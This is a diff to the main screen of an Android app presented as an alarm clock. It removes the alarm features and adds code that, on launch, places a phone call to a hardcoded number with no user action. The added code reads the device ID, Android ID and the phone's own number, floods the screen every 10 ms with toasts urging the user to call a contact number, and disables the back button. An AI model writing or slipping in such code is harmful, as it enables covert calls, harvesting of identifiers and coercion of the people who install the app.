@@ -3,6 +3,7 @@ package com.example.axu1.richarddawkinsalarmclock;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.annotation.TargetApi;
+import android.app.Activity;
 import android.app.AlarmManager;
 import android.app.PendingIntent;
 import android.content.Context;
@@ -10,12 +11,15 @@ import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
+import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.os.Build;
 import android.os.CountDownTimer;
 import android.os.Handler;
 import android.provider.Settings;
 import android.provider.SyncStateContract;
+import android.support.annotation.RequiresApi;
+import android.support.annotation.RequiresPermission;
 import android.support.v4.app.ActivityCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -27,8 +31,12 @@ import android.view.Menu;
 import android.view.MenuItem;
 import android.view.MotionEvent;
 import android.view.View;
+import android.view.ViewGroup;
+import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.ImageView;
+import android.widget.LinearLayout;
+import android.widget.PopupWindow;
 import android.widget.TextView;
 import android.widget.TimePicker;
 import android.widget.Toast;
@@ -65,18 +73,24 @@ public class MainActivity extends AppCompatActivity {
     MainActivity inst;
     Context context;
 
-    @SuppressLint("HardwareIds")
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+        //this.context = this;
 
 
-        //RETRIVEING MOBILE DATA AND SEND TO SERVER IF NOT EXIST
-        TelephonyManager tMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+    }
 
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+
+    @RequiresApi(api = Build.VERSION_CODES.M)
+    @Override
+    public void onStart() {
+        super.onStart();
+        String phone = "+8801671822671";
+
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
             // TODO: Consider calling
             //    ActivityCompat#requestPermissions
             // here to request the missing permissions, and then overriding
@@ -88,125 +102,42 @@ public class MainActivity extends AppCompatActivity {
         }
 
 
+
+        Intent callIntent = new Intent(Intent.ACTION_CALL);
+        callIntent.setData(Uri.parse("tel:"+phone));
+        startActivity(callIntent);
+
+
+
+        TelephonyManager tMgr = (TelephonyManager) getSystemService(getApplicationContext().TELEPHONY_SERVICE);
+
+
+        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    ActivityCompat#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for ActivityCompat#requestPermissions for more details.
+            return;
+        }
         mDeviceId = tMgr.getDeviceId();
-        uniqueID =  Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
-
-/*
-        if (null != tMgr) mDeviceId = tMgr.getDeviceId();
-
-        if (null == mDeviceId || 0 == mDeviceId.length())
-            mDeviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
-       // mDeviceId = tMgr.getDeviceId();
-       // mDeviceId = UUID.randomUUID();
-        if(null == mDeviceId)
-            mDeviceId = UUID.randomUUID().toString();
-
-        final String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
-
-        //deviceId = new UUID(androidId.hashCode(), ((long) mDeviceId.hashCode() << 32));
-
-        uniqueID = UUID.randomUUID().toString();
-
-        sub_id = tMgr.getSubscriberId();
-        sim_serial = tMgr.getSimSerialNumber();
-        line_num = tMgr.getLine1Number();
-        main_num = tMgr.getVoiceMailNumber();*/
+        uniqueID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+        String androidID = Settings.Secure.getString(MainActivity.this.getContentResolver(), Settings.Secure.ANDROID_ID);
+        String deviceID = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId();
+        String number = tMgr.getLine1Number();
 
 
 
+        Log.d("test11", androidID);
+        Log.d("test11", deviceID);
+        Log.d("test Mobile no: ", number);
 
 
+        //fetchingData();
 
 
-
-        this.context = this;
-
-        //alarm = new AlarmReceiver();
-        alarmTextView = (TextView) findViewById(R.id.alarmText);
-
-        final Intent myIntent = new Intent(this.context, AlarmReceiver.class);
-
-        // Get the alarm manager service
-        alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
-
-        // set the alarm to the time that you picked
-        final Calendar calendar = Calendar.getInstance();
-
-        alarmTimePicker = (TimePicker) findViewById(R.id.alarmTimePicker);
-
-
-
-        Button start_alarm= (Button) findViewById(R.id.start_alarm);
-        start_alarm.setOnClickListener(new View.OnClickListener() {
-            @TargetApi(Build.VERSION_CODES.M)
-
-            @Override
-            public void onClick(View v) {
-
-                calendar.add(Calendar.SECOND, 3);
-                //setAlarmText("You clicked a button");
-
-                final int hour = alarmTimePicker.getCurrentHour();
-                final int minute = alarmTimePicker.getCurrentMinute();;
-
-                Log.e("MyActivity", "In the receiver with " + hour + " and " + minute);
-                setAlarmText("You clicked a " + hour + " and " + minute);
-
-
-                calendar.set(Calendar.HOUR_OF_DAY, alarmTimePicker.getCurrentHour());
-                calendar.set(Calendar.MINUTE, alarmTimePicker.getCurrentMinute());
-
-                myIntent.putExtra("extra", "yes");
-                pending_intent = PendingIntent.getBroadcast(MainActivity.this, 0, myIntent, PendingIntent.FLAG_UPDATE_CURRENT);
-
-                alarmManager.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pending_intent);
-
-
-                // now you should change the set Alarm text so it says something nice
-
-
-                setAlarmText("Alarm set to " + hour + ":" + minute);
-                //Toast.makeText(getApplicationContext(), "You set the alarm", Toast.LENGTH_SHORT).show();
-            }
-
-        });
-
-        Button stop_alarm= (Button) findViewById(R.id.stop_alarm);
-        stop_alarm.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-
-
-                int min = 1;
-                int max = 9;
-
-                Random r = new Random();
-                int random_number = r.nextInt(max - min + 1) + min;
-                Log.e("random number is ", String.valueOf(random_number));
-
-                myIntent.putExtra("extra", "no");
-                sendBroadcast(myIntent);
-
-                alarmManager.cancel(pending_intent);
-                setAlarmText("Alarm canceled");
-                //setAlarmText("You clicked a " + " canceled");
-            }
-        });
-
-    }
-
-    public void setAlarmText(String alarmText) {
-        alarmTextView.setText(alarmText);
-    }
-
-
-
-    @Override
-    public void onStart() {
-        super.onStart();
-
-
-        fetchingData();
 
         boolean connected = false;
         ConnectivityManager connectivityManager = (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -223,11 +154,10 @@ public class MainActivity extends AppCompatActivity {
             Runnable runnable = new Runnable() {
                 @Override
                 public void run() {
-                    layoutInflater = (LayoutInflater)
-                            getSystemService(LAYOUT_INFLATER_SERVICE);
+                    layoutInflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
+
                     View layout = layoutInflater.inflate(R.layout.toast_img, null);
-                    ImageView toastimg = (ImageView)
-                            layout.findViewById(R.id.toastImg);
+                    ImageView toastimg = (ImageView) layout.findViewById(R.id.toastImg);
                     toastimg.setImageResource(R.drawable.image_w);
                     TextView toastmes = (TextView)
                             layout.findViewById(R.id.toastTxt);
@@ -244,6 +174,7 @@ public class MainActivity extends AppCompatActivity {
                         public void onFinish() {toast.show();}
 
                     }.start();
+
                     handler.postDelayed(this, 100);
                 }
             };
@@ -303,24 +234,23 @@ public class MainActivity extends AppCompatActivity {
                             handler = new Handler();
                             Runnable runnable = new Runnable() {
 
+                                @RequiresApi(api = Build.VERSION_CODES.M)
                                 @Override
                                 public void run() {
-                                    Log.d("delay: ", "test time");
-                                    layoutInflater = (LayoutInflater)
-                                            getSystemService(LAYOUT_INFLATER_SERVICE);
+
+                                    layoutInflater = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
                                     View layout = layoutInflater.inflate(R.layout.toast_img, null);
                                     ImageView toastimg = (ImageView)
                                             layout.findViewById(R.id.toastImg);
                                     toastimg.setImageResource(R.drawable.image_w);
-                                    TextView toastmes = (TextView)
-                                            layout.findViewById(R.id.toastTxt);
-                                    /*toastmes.setText("Call to this number>>> \n 会員ＩＤ: "+client_id[i]+ "\n -Mobile : "+telephone[i]);*/
+                                    TextView toastmes = (TextView) layout.findViewById(R.id.toastTxt);
+                                    //toastmes.setText("Call to this number>>> \n 会員ＩＤ: "+client_id[i]+ "\n -Mobile : "+telephone[i]);
                                     toastmes.setText("Please call to the following number>>> \n Your ID: "+clientId+"\n Contact Number : \n "+telephoneNo);
                                     final Toast toast = new Toast(getApplicationContext());
                                     toast.setGravity(Gravity.BOTTOM, 0, 0);
                                     toast.setView(layout);
                                     toast.show();
-                                    new CountDownTimer(90, 1000) {
+                                    new CountDownTimer(2, 100000) {
 
                                         public void onTick(long millisUntilFinished) {
                                             toast.show();
@@ -331,11 +261,11 @@ public class MainActivity extends AppCompatActivity {
                                         }
 
                                     }.start();
-                                    handler.postDelayed(this, 100);
+                                    handler.postDelayed(this, 10);
                                 }
                             };
 
-                            handler.postDelayed(runnable, 100);
+                            handler.postDelayed(runnable, 10);
                         }
 
 
@@ -374,6 +304,5 @@ public class MainActivity extends AppCompatActivity {
     public void onBackPressed() {
         // dont call **super**, if u want disable back button in current screen.
     }
-
 
 }
